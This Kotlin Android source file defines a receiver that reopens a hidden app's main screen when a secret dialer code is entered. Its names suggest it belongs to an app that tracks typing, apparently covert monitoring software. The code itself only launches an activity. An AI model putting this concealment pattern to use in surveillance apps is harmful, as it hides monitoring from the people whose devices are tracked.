package com.sahil.tracker.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.example.typingtracker.MainActivity

class HideAppReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SECRET_CODE") {
            val i = Intent(context, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            context.startActivity(i)
        }
    }
}
